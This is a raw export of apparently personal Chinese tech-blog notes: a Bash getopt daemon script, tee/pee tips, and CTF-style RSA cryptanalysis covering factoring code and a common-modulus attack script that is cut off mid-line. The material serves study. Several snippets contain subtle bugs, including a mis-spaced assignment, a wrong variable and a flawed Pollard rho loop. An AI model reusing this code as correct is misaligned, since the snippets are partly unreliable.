class="token keyword">echo</span> hahaflock -w 5 -s a.lock -c <span class="token function">cat</span></code></pre><h5 id="17-2-设计脚本的选项：getopt"><a href="#17-2-设计脚本的选项：getopt" class="headerlink" title="17.2 设计脚本的选项：getopt"></a>17.2 设计脚本的选项：getopt</h5><p> <a href="https://www.cnblogs.com/f-ck-need-u/p/9757959.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/9757959.html</a> </p><p> <a href="https://www.cnblogs.com/f-ck-need-u/p/9758075.html#blog1" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/9758075.html#blog1</a> </p><ol><li><p>bash内置命令getopts</p></li><li><p>getopt设计的选项的共性</p><ul><li><p>短选项可以连在一起</p></li><li><p>参数可以给多个，而且放置的位置任意</p></li><li><p>选项型参数可以和选项连在一起，也可以空格分开</p></li></ul></li><li><p>getopt的功能：解析选项并将解析的结果分类整理</p></li><li><p>选项：短选项、长选项</p></li><li><p>参数</p><ul><li>选项型参数：必须跟在选项后（选项型参数可以和选项连在一起）</li><li>非选项型参数：可任意放置位置</li></ul></li><li><p>自己设计脚本–功能</p><ul><li>把sleep 当成守护进程去运行</li><li>可以去启动、可以去终止这个守护进程</li><li>指定sleep 睡眠时长的参数，也可以以配置文件的方式提供</li><li>指定pid文件</li><li>选项以及参数<ul><li>非选项型参数：睡眠时长</li><li><code>-c/--config</code>：睡眠时长</li><li><code>-s/--start</code>：启动模式</li><li><code>-k/--kill</code>：终止进程</li><li><code>-p/--pidfile</code>：指定守护进程的pid文件</li><li><code>-v/--version</code></li><li><code>-h/--help</code></li></ul></li></ul></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">## 注意:1. [  ]  里面和两边都需要有空格分开</span><span class="token comment" spellcheck="true">##      2. 判断使用 == ，而不是=  </span>VERSION<span class="token operator">=</span>1.0<span class="token keyword">function</span> usage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">cat</span> <span class="token operator">&lt;&lt;</span><span class="token string">EOF    usage: <span class="token variable">$0</span> [OPTIONS] [TIME]     options:        -s,--start   start mode        -k,--kill    kill mode         -c,--config  config        -p,--pidfile pidfile        -h,--help    print help info        -v,--version print VERSIONEOF</span><span class="token punctuation">}</span>args<span class="token operator">=</span>`getopt -n <span class="token string">"<span class="token variable">$0</span>"</span> -o skc:p:vh -l start,kill,config:,pidfile:,version,help -- <span class="token string">"<span class="token variable">$@</span>"</span> `<span class="token keyword">echo</span> <span class="token string">"args:<span class="token variable">$args</span>"</span><span class="token comment" spellcheck="true">#通过 set -- args  将args变量当中的选项和参数设置成bash的位置变量</span><span class="token comment" spellcheck="true"># $1,$2</span><span class="token function">eval</span> <span class="token keyword">set</span> -- <span class="token string">"<span class="token variable">$args</span>"</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span>     <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token keyword">in</span>         -s<span class="token operator">|</span>--start<span class="token punctuation">)</span>            <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$mode</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"-s/-c/-k  can't use together"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            mode<span class="token operator">=</span><span class="token string">"start"</span>            <span class="token function">shift</span>            <span class="token punctuation">;</span><span class="token punctuation">;</span>        -k<span class="token operator">|</span>--kill<span class="token punctuation">)</span>            <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$mode</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"-s/-c/-k  can't use together"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            mode<span class="token operator">=</span><span class="token string">"kill"</span>            <span class="token function">shift</span> <span class="token comment" spellcheck="true">## 把当前第一个位置参数给踢掉，那么第二个就变成了第一个</span>            <span class="token punctuation">;</span><span class="token punctuation">;</span>        -c<span class="token operator">|</span>--config<span class="token punctuation">)</span>            config<span class="token operator">=</span><span class="token variable">$2</span>            <span class="token function">shift</span> 2 <span class="token comment" spellcheck="true">## 有选项存在，所以shift 两次</span>            <span class="token punctuation">;</span><span class="token punctuation">;</span>        -p<span class="token operator">|</span>--pidfile<span class="token punctuation">)</span>            pidfile<span class="token operator">=</span><span class="token variable">$2</span>            <span class="token function">shift</span> 2            <span class="token punctuation">;</span><span class="token punctuation">;</span>        -h<span class="token operator">|</span>--help<span class="token punctuation">)</span>            usage<span class="token punctuation">;</span><span class="token keyword">exit</span> 1            <span class="token punctuation">;</span><span class="token punctuation">;</span>        -v<span class="token operator">|</span>--version<span class="token punctuation">)</span>            <span class="token keyword">echo</span> <span class="token variable">$VERSION</span>            <span class="token keyword">exit</span> 1            <span class="token punctuation">;</span><span class="token punctuation">;</span>        --<span class="token punctuation">)</span>            time<span class="token operator">=</span><span class="token variable">$2</span>            <span class="token function">shift</span>             <span class="token keyword">break</span>             <span class="token punctuation">;</span><span class="token punctuation">;</span>        *<span class="token punctuation">)</span>            usage            <span class="token keyword">exit</span> 1    esac<span class="token keyword">done</span><span class="token comment" spellcheck="true">## 必须要给模式，如果不给，就是用默认start</span><span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$mode</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> mode<span class="token operator">=</span><span class="token string">"start"</span><span class="token comment" spellcheck="true">## 如果没有给定pidfile，就使用默认的pidfile=/tmp/mysleep.pid</span><span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$pidfile</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> pidfile<span class="token operator">=</span>/tmp/mysleep.pid<span class="token comment" spellcheck="true">#  在启动模式下，必须要给一个且只能给一个time</span><span class="token comment" spellcheck="true"># 在终止模式下，可以给可以不给</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$mode</span>"</span> <span class="token operator">==</span> <span class="token string">"start"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span><span class="token comment" spellcheck="true"># start mode </span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$config</span>"</span> -a -n <span class="token string">"<span class="token variable">$time</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token keyword">echo</span> <span class="token string">"config and time can 't use together"</span>        <span class="token keyword">exit</span> 1<span class="token punctuation">;</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$config</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> -r <span class="token string">"<span class="token variable">$config</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">then</span>             <span class="token function">read</span> line <span class="token operator">&lt;</span><span class="token string">"<span class="token variable">$config</span>"</span>            <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"time invalid"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${line//[0-9]/}</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"time invalid"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token function">time</span> <span class="token operator">=</span> <span class="token variable">$line</span>        <span class="token keyword">else</span>            <span class="token keyword">echo</span> <span class="token string">"config unreadable"</span>            <span class="token keyword">exit</span> 1<span class="token punctuation">;</span>        <span class="token keyword">fi</span>    <span class="token keyword">elif</span> <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">$time</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${line//[0-9]/}</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"time invalid"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">else</span>         <span class="token keyword">echo</span> <span class="token string">"must give me a time to sleep"</span>        <span class="token keyword">exit</span> 1    <span class="token keyword">fi</span><span class="token keyword">else</span>    <span class="token comment" spellcheck="true"># kill mode</span>    <span class="token keyword">:</span><span class="token keyword">fi</span><span class="token keyword">echo</span> <span class="token string">"mode : <span class="token variable">$mode</span>"</span><span class="token keyword">echo</span> <span class="token string">"pidfile : <span class="token variable">$pidfile</span>"</span><span class="token keyword">echo</span> <span class="token string">"time : <span class="token variable">$time</span>"</span><span class="token keyword">function</span> startmysleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    pidfile<span class="token operator">=</span><span class="token variable">$1</span>    time<span class="token operator">=</span><span class="token variable">$2</span>    <span class="token comment" spellcheck="true"># $!： 表示最近一个后台子进程的pid</span>    <span class="token punctuation">(</span> <span class="token function">sleep</span> <span class="token variable">$time</span> <span class="token operator">&amp;</span> <span class="token keyword">echo</span> <span class="token variable">$!</span> <span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token string">"<span class="token variable">$pidfile</span>"</span><span class="token punctuation">}</span><span class="token keyword">function</span> killmysleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    pidfile<span class="token operator">=</span><span class="token variable">$1</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> -r <span class="token string">"<span class="token variable">${pidfile}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>         <span class="token keyword">while</span> <span class="token function">read</span> pid<span class="token punctuation">;</span><span class="token keyword">do</span>             <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$pid</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"pid invalid"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token punctuation">[</span> -n <span class="token string">"<span class="token variable">${pid//[0-9]/}</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"pid invalid"</span><span class="token punctuation">;</span><span class="token keyword">exit</span> 1<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"this <span class="token variable">$pid</span> has been killed...."</span>            <span class="token function">kill</span> <span class="token variable">$pid</span>        <span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">${pidfile}</span>"</span>        <span class="token function">rm</span> -rf <span class="token string">"<span class="token variable">$pidfile</span>"</span>        <span class="token keyword">return</span> 0    <span class="token keyword">fi</span>    <span class="token keyword">echo</span> <span class="token string">"<span class="token variable">${pidfile}</span> unreadable"</span>    <span class="token keyword">return</span> 1<span class="token punctuation">}</span><span class="token keyword">case</span> <span class="token string">"<span class="token variable">$mode</span>"</span> <span class="token keyword">in</span>    start<span class="token punctuation">)</span>        startmysleep <span class="token variable">$pidfile</span> <span class="token variable">$time</span>        <span class="token punctuation">;</span><span class="token punctuation">;</span>    kill<span class="token punctuation">)</span>        killmysleep <span class="token variable">$pidfile</span>         <span class="token punctuation">;</span><span class="token punctuation">;</span>    *<span class="token punctuation">)</span>        usage        <span class="token keyword">exit</span> 1esac</code></pre><h5 id="17-3-tee命令的花式用法"><a href="#17-3-tee命令的花式用法" class="headerlink" title="17.3  tee命令的花式用法"></a>17.3  tee命令的花式用法</h5><ol><li><code>echo haha | tee file1 file2 file3</code></li><li><code>tee &gt;(cmd1) &gt;(cmd2) stdout</code><ul><li>数据可能会和bash的命令提示符混合在一起</li><li>解决方案：再把数据通过管道输出给cat （可避免后台进程执行不完就出现命令提示符的状况）  或  把进程替换的数据分别写入不同文件</li><li>多个命令的输出结果顺序无法保证</li></ul></li><li>tee 只能把数据传递给多个文件，不能传递给多个命令（除非使用进程替换：进程替换是数据传递给虚拟文件，然后从虚拟文件读取数据，不建议用进程替换，顺序会乱）</li></ol><p><code>echo  haha | tee &gt;(grep &quot;a&quot;) &gt;(sed &quot;s/haha/heihei/&quot;) &gt;/dev/null | cat</code></p><h5 id="17-4-pee命令"><a href="#17-4-pee命令" class="headerlink" title="17.4  pee命令"></a>17.4  pee命令</h5><ol><li>数据传递给多个命令，并且保证最后的输出顺序</li></ol><p><code>echo haha | pee &quot;grep &#39;a&#39;&quot; &quot;sed &#39;s/haha/heihei/&#39;&quot;</code></p><h5 id="17-5-shell脚本的规范："><a href="#17-5-shell脚本的规范：" class="headerlink" title="17.5 shell脚本的规范："></a>17.5 shell脚本的规范：</h5><p> <a href="https://zh-google-styleguide.readthedocs.io/en/latest/google-shell-styleguide/contents/" target="_blank" rel="noopener">https://zh-google-styleguide.readthedocs.io/en/latest/google-shell-styleguide/contents/</a> </p><h5 id="17-6-shell脚本编程书籍推荐："><a href="#17-6-shell脚本编程书籍推荐：" class="headerlink" title="17.6 shell脚本编程书籍推荐："></a>17.6 shell脚本编程书籍推荐：</h5><p>《shell脚本专家指南》</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Bash-Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2020/03/30/rsa/"/>
      <url>/2020/03/30/rsa/</url>
      
        <content type="html"><![CDATA[<h3 id="11-RSA"><a href="#11-RSA" class="headerlink" title="11.RSA"></a>11.RSA</h3><h4 id="1-介绍："><a href="#1-介绍：" class="headerlink" title="1.介绍："></a>1.介绍：</h4><ul><li><p>RSA加加密算法是一种非对称加密算法；</p></li><li><p>RSA公开密钥密码体制。所谓的公开密钥密码体制就是使用不同的加密密钥与解密密钥，是一种<strong>“由己知加密密钥推导出解密密钥在计算上是不可行的”</strong>密码体制。</p></li><li><p>RSA的安全性依赖于<strong>大数分解</strong></p></li></ul><h4 id="2-数学知识"><a href="#2-数学知识" class="headerlink" title="2.数学知识"></a>2.数学知识</h4><ol><li><strong>欧拉函数：求小于<code>x</code>并且和<code>x</code>互质的数的个数</strong></li></ol><ul><li><p><strong>φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)……(1-1/pn)</strong></p></li><li><p><strong>n = (p-1)(q-1)</strong>：这个式子仅在某种情况下适用</p></li><li><p>理解<strong>互质</strong>的概念</p><ul><li>10 = 2 * 5 （等于两个质数相乘）</li><li>小于10并且与10互质的数：1 3 7 9    （欧拉函数结果为4个）</li><li>10的欧拉函数是 <code>φ(10)= (5-1)(2-1)=4</code></li></ul></li></ul><ol start="2"><li><p>模反元素：</p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/模反元素.png" style="zoom: 67%;" /></li></ol><ul><li><code>e乘d减一等于φ(n)的倍数</code>、 <strong><code>e与φ(n)是互质的</code></strong>、 <code>ed+φ(n)*y=1</code></li></ul><ol start="3"><li><p>贝祖定理：此处去B站搜索李永乐老师关于贝祖数的视频 <strong>BV1mJ411q7xw</strong> </p><ul><li><p><code>ax+by=m</code>，如果x,y有整数解的话，它的充要条件是  <code>m是a和b最大公约数的整数倍：m=gcd(a,b)*k</code>：这个（a,b）代表a与b的最大公约数</p></li><li><p>此时，x和y的整数解 称之为 <strong>贝祖数</strong></p></li></ul></li></ol><pre class=" language-python"><code class="language-python">     <span class="token keyword">def</span> <span class="token function">exgcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">if</span> b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>             <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             x<span class="token punctuation">,</span>y <span class="token operator">=</span> exgcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span>             tmpx <span class="token operator">=</span> x             x <span class="token operator">=</span> y             y <span class="token operator">=</span> tmpx<span class="token operator">-</span><span class="token punctuation">(</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span><span class="token operator">*</span>y             <span class="token keyword">return</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>     <span class="token keyword">print</span> exgcd<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token operator">//</span> 替换<span class="token number">13</span>和<span class="token number">2</span>就可以</code></pre><p>​     </p><h4 id="3-RSA加密过程"><a href="#3-RSA加密过程" class="headerlink" title="3.RSA加密过程"></a>3.RSA加密过程</h4><ul><li><p>第一步，随机选择两个不相等的质数p和q。</p><ul><li>选择 61 和 53 。( 实际应用中，这两个质数越大，就越难破解。)</li></ul></li><li><p>第二步，计算p和q的乘积n。 <strong>n =  61x53 = 3233</strong></p></li><li><p>第三步，计算 n 的欧拉函数φ(n)。</p><ul><li><code>φ(n)= (p-1)(q-1)</code></li><li>结果为60 * 52 = 3120</li></ul></li><li><p>第四步，随机选择一个整数e， 条件是<code>1&lt;e &lt; φ(n)</code>，且<strong>e</strong>与<strong>φ(n)</strong>互质。<br>在1到3120之 间，随机选择了17。( 实际应用中，常常选择65537）</p></li><li><p>第五步，计算e对于φ(n)的<strong>模反元素d</strong>。</p><ul><li>已知e=17,中<strong>φ(n)=3120</strong></li><li>17x + 3120y= 1</li><li><code>e乘模反元素+欧拉函数*y=1</code></li></ul></li><li><p>欧拉函数就是小于n并且与n互质的数的个数</p><ul><li>算出一组整数解为(x,y)=(2753,-15),即 d=2753</li></ul></li><li><p>第六步，将n  （3233）和e  （17）封装成公钥，n  （3233）和d  （2753）（贝祖数的其中一个）封装成私钥。<br>n=3233，e=17, d=2753， 所以公钥就是(3233,17)，私钥就是(3233, 2753)</p></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/rsa-3.png" style="zoom:50%;" /><p>公钥：pub = （n,e）</p><p>私钥：pri =  （n,d）</p><p>c =  m ^ e (mod n)</p><p>m = c  ^ d  (mod n)</p><h4 id="4-简单例题"><a href="#4-简单例题" class="headerlink" title="4.简单例题"></a>4.简单例题</h4><ul><li>知道了  p  ,  q  ,  e  ,  c，但是不知道 n ，可以通过  p  q  算出来  n (p  * q)</li><li>使用python的gmpy2 模块，计算</li><li>调用python 函数：pow( c , d , n)  ：c的d次方mod n</li></ul><pre class=" language-python"><code class="language-python">  <span class="token keyword">import</span> gmpy2  p<span class="token operator">=</span> <span class="token number">9648423029010515676590</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  q<span class="token operator">=</span> <span class="token number">1187484383798029703209</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  e<span class="token operator">=</span> <span class="token number">65537</span>  c<span class="token operator">=</span> <span class="token number">8320829899517460417477</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">//</span>c是密文  phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>           <span class="token operator">//</span>求欧拉函数  d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>     <span class="token operator">//</span>求模反元素  n<span class="token operator">=</span>p<span class="token operator">*</span>q                       <span class="token operator">//</span>求n  <span class="token keyword">print</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>            <span class="token operator">//</span>答案</code></pre><h4 id="5-pem的例题"><a href="#5-pem的例题" class="headerlink" title="5.pem的例题"></a>5.pem的例题</h4><ul><li>提取pem中的信息：</li></ul><pre><code>  openssl rsa -pubin -text -modulus -in pubkey.pem</code></pre>  <img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/解pem的信息.png" style="zoom:50%;" /><ul><li><p>此时拿到了 e 和 n ，但是没有 p和q ，所以进行大数分解</p><ul><li><p>使用python库：pycryptodome 获取 n 和 e</p></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/pycrypto.png" style="zoom:50%;" /></li></ul></li></ul><pre><code>    from Crypto.PublicKey import RSA    r=open(pubLic.pem).read()    pub =RSA.importKey(r)    n = pub.n    e = pub.e</code></pre><p>​    </p><ul><li><p>对n进行分解：拿到  p  和  q</p><ul><li>在线分解<br><a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a></li><li>Sage（搭建本地环境）<br><a href="https://hub.docker.com/u/sagemath/" target="_blank" rel="noopener">https://hub.docker.com/u/sagemath/</a><br><a href="http://www.sagemath.org/" target="_blank" rel="noopener">http://www.sagemath.org/</a></li><li>Msieve<br><a href="http://gilchrist.caljeff/factoring/index.html" target="_blank" rel="noopener">http://gilchrist.caljeff/factoring/index.html</a> .</li><li>yafu工具</li></ul></li><li><p>返回第四步的例子，求解</p></li><li><p>解题时，最后的  明文（16进制数）是否可以转化为str（不能是奇数位），如果是奇数位，必须在最前面补0</p></li></ul><h4 id="6-大数分解算法"><a href="#6-大数分解算法" class="headerlink" title="6.大数分解算法"></a>6.大数分解算法</h4><ul><li>Pollard rho </li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> randint<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">0x4333AF6B43F36028D8D9650EC3EED3238541EE5C15E626C58C9EC33674A6D08D5B1F2580A1A0B07E9D853536CD994E197889D122701A62BB2A9E79559F3D5281014535F6C54F83CA8D9700EEB67D99AF318D20A5150AD46D622A6A12DE0A758EE7DF75F5D10F2FE2585F2348537787063321FFDAC91BB3C3D1D88CBD04A824ED</span>x2 <span class="token operator">=</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    x1 <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    x2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>x2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">+</span>c<span class="token operator">%</span>n    fac <span class="token operator">=</span> gcd<span class="token punctuation">(</span>abs<span class="token punctuation">(</span>x1<span class="token operator">-</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> fac<span class="token operator">></span><span class="token number">1</span> <span class="token operator">and</span> is_prime<span class="token punctuation">(</span>fac<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> fac        <span class="token keyword">break</span><span class="token keyword">print</span> n<span class="token operator">/</span>fac</code></pre><ul><li>Pollard rho p-1 </li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">PollardRho_p_1</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> i <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pow<span class="token punctuation">(</span>a<span class="token punctuation">,</span> i<span class="token punctuation">,</span> N<span class="token punctuation">)</span>        d <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>        <span class="token keyword">if</span> d <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> d        i <span class="token operator">+=</span> <span class="token number">1</span></code></pre><ul><li>Fermat </li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">Fermat</span><span class="token punctuation">(</span>Q<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> isqrt_rem<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>    b <span class="token operator">=</span> a <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> n    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        q <span class="token operator">=</span> isqrt_rem<span class="token punctuation">(</span>b<span class="token punctuation">)</span>        <span class="token keyword">if</span> q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> a <span class="token operator">-</span> q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        a <span class="token operator">+=</span> <span class="token number">1</span>        b <span class="token operator">=</span> a <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> n</code></pre><h4 id="7-共模攻击（自行百度）"><a href="#7-共模攻击（自行百度）" class="headerlink" title="7.共模攻击（自行百度）"></a>7.共模攻击（自行百度）</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/共模攻击.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/共模攻击-2.png" style="zoom:50%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/共模攻击-3.png" style="zoom: 33%;" /></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/RSA/共模攻击-4.png" style="zoom:50%;" /></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: cp936 -*-</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">158052722013789461456896900244510199169216575693048895162538548356466884311543740968048825149608833390255268602486435690724338965409521812963337715301197225841194835534751041470231293288252951274190599189716955573428884560130364021535005115652592074445852835422027406556727605302404510264249211145063332337043</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">665213</span><span class="token punctuation">,</span> <span class="token number">368273</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span>16698617641888248664694980135332125531792692516788088682722832061393117609508765284473236240256421599515450690670639565968165473479697383505401285976148490839526672808730165847471005704945978274496508928460578173068717106075169723401049489389383596761956301440156581021583368058047939083755488885694261340425L<span class="token punctuation">,</span> 59192887933967939708054321952273893559113509451228797382728687616356609407020086787061368452871936378934964292805289941535766263083244529814852043063188312786173717046316177403357053871483983775362121186037776932260378728059531236711960979620603784044468207000654149190295060179235411429700710154759043236436L<span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">'[+]Detecting m...'</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 求模反元素</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c1<span 